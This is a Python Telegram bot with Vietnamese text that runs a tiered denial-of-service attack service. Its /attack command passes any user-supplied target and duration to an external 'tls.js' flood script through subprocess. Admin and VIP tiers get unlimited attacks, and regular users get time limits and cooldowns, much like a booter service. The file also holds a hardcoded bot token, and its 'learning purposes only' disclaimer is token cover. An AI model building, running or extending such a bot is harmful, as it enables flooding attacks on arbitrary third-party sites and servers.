import asyncio
import subprocess
import shlex
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Thay thế bằng token bot của bạn
BOT_TOKEN = "8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"

# Cấu hình admin và VIP
ADMIN_IDS = {123456789, 987654321}  # Thay bằng ID Telegram của admin thực tế
VIP_IDS = {555555555, 666666666}    # Thay bằng ID Telegram của VIP thực tế

# Dictionary để lưu thời gian sử dụng lệnh của user thường (cho cooldown)
user_cooldown = {}
USER_COOLDOWN = 120  # 120 giây cooldown cho user thường
MAX_USER_TIME = 120  # 120 giây tối đa cho user thường

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    welcome_text = f"""
🤖 Bot Attack TLS đã khởi động!

👤 Loại tài khoản: {user_type}
💡 Các lệnh có sẵn:
/attack <target> <time> - Gửi request tấn công
/help - Hiển thị hướng dẫn
/myinfo - Thông tin tài khoản

📋 Quy định:
{get_usage_rules(user_type)}
    """
    await update.message.reply_text(welcome_text)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    # Kiểm tra tham số
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Sai cú pháp!\n"
            "✅ Sử dụng: /attack <target> <time>\n"
            "📝 Ví dụ: /attack example.com 60"
        )
        return

    target = context.args[0]
    attack_time = int(context.args[1])
    
    # Kiểm tra quyền và giới hạn
    check_result = check_attack_permission(user_id, user_type, attack_time)
    if not check_result["allowed"]:
        await update.message.reply_text(check_result["message"])
        return
    
    try:
        # Thông báo đang xử lý
        processing_msg = await update.message.reply_text(
            f"🎯 Đang tấn công {target} trong {attack_time}s...\n"
            f"👤 User: {user_type}\n"
            f"⏰ Thời gian: {attack_time}s"
        )
        
        # Xây dựng lệnh
        command = f"node tls.js GET {target} {attack_time} 4 5 y.txt --http 2 --debug --winter --full"
        
        # Cập nhật thời gian sử dụng lệnh cho user thường
        if user_type == "User Thường":
            user_cooldown[user_id] = time.time()
        
        # Chạy lệnh với timeout
        timeout_duration = attack_time + 30
        result = subprocess.run(
            shlex.split(command),
            capture_output=True,
            text=True,
            timeout=timeout_duration
        )
        
        # Xử lý kết quả
        if result.returncode == 0:
            success_msg = (
                f"✅ Tấn công thành công!\n"
                f"🎯 Target: {target}\n"
                f"⏰ Thời gian: {attack_time}s\n"
                f"👤 User Type: {user_type}"
            )
            
            # Thêm output nếu có
            output = result.stdout.strip()
            if output:
                # Lấy 500 ký tự đầu tiên của output để tránh tin nhắn quá dài
                short_output = output[:500] + ("..." if len(output) > 500 else "")
                success_msg += f"\n📊 Output:\n`{short_output}`"
            
            await processing_msg.edit_text(success_msg, parse_mode='Markdown')
        else:
            error_msg = result.stderr.strip() or "Lỗi không xác định"
            await processing_msg.edit_text(f"❌ Lỗi khi chạy lệnh:\n`{error_msg}`", parse_mode='Markdown')
            
    except subprocess.TimeoutExpired:
        await processing_msg.edit_text(f"⏰ Timeout: Lệnh chạy quá {timeout_duration} giây")
    except Exception as e:
        await processing_msg.edit_text(f"❌ Lỗi không xác định: {str(e)}")

async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    info_text = f"""
📊 Thông tin tài khoản:

🆔 User ID: `{user_id}`
👤 Loại tài khoản: {user_type}
📋 Quyền hạn: {get_permissions_text(user_type)}
    """
    
    # Thêm thông tin cooldown cho user thường
    if user_type == "User Thường":
        remaining_cooldown = get_remaining_cooldown(user_id)
        if remaining_cooldown > 0:
            info_text += f"\n⏰ Cooldown còn lại: {remaining_cooldown} giây"
        else:
            info_text += f"\n✅ Có thể sử dụng lệnh ngay"
    
    await update.message.reply_text(info_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
📖 **Hướng dẫn sử dụng:**

⚡ **Lệnh tấn công:**
/attack <target> <time>
• target: URL hoặc IP mục tiêu
• time: Thời gian tấn công (giây)

📋 **Quy định sử dụng:**
• Admin: Không giới hạn
• VIP: Không giới hạn  
• User thường: Tối đa 120s, cooldown 120s

🔍 **Lệnh khác:**
/myinfo - Xem thông tin tài khoản
/help - Hiển thị hướng dẫn

⚠️ **Lưu ý:** Chỉ sử dụng cho mục đích học tập và được sự cho phép!
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

def get_user_type(user_id):
    """Xác định loại user"""
    if user_id in ADMIN_IDS:
        return "Admin"
    elif user_id in VIP_IDS:
        return "VIP"
    else:
        return "User Thường"

def get_usage_rules(user_type):
    """Lấy thông tin quy định sử dụng theo loại user"""
    if user_type == "Admin":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ"
    elif user_type == "VIP":
        return "• Thời gian: KHÔNG GIỚI HẠN\n• Cooldown: KHÔNG CÓ"
    else:
        return f"• Thời gian: Tối đa {MAX_USER_TIME}s\n• Cooldown: {USER_COOLDOWN}s"

def get_permissions_text(user_type):
    """Lấy mô tả quyền hạn"""
    if user_type == "Admin":
        return "Toàn quyền (Unlimited)"
    elif user_type == "VIP":
        return "VIP (Unlimited)"
    else:
        return f"Standard (Max {MAX_USER_TIME}s, CD {USER_COOLDOWN}s)"

def check_attack_permission(user_id, user_type, attack_time):
    """Kiểm tra quyền sử dụng lệnh attack"""
    
    # Kiểm tra user thường vượt quá thời gian cho phép
    if user_type == "User Thường" and attack_time > MAX_USER_TIME:
        return {
            "allowed": False,
            "message": f"❌ User thường chỉ được tối đa {MAX_USER_TIME} giây!"
        }
    
    # Kiểm tra cooldown cho user thường
    if user_type == "User Thường":
        remaining = get_remaining_cooldown(user_id)
        if remaining > 0:
            return {
                "allowed": False,
                "message": f"⏰ Vui lòng chờ {remaining} giây trước khi sử dụng lại lệnh!"
            }
    
    return {"allowed": True, "message": ""}

def get_remaining_cooldown(user_id):
    """Tính thời gian cooldown còn lại"""
    if user_id not in user_cooldown:
        return 0
    
    elapsed = time.time() - user_cooldown[user_id]
    remaining = USER_COOLDOWN - elapsed
    return max(0, int(remaining))

def main():
    # Khởi tạo application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myinfo", myinfo_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Chạy bot
    print("🤖 Bot đang chạy...")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"⭐ VIP IDs: {VIP_IDS}")
    application.run_polling()

if __name__ == "__main__":
    main()
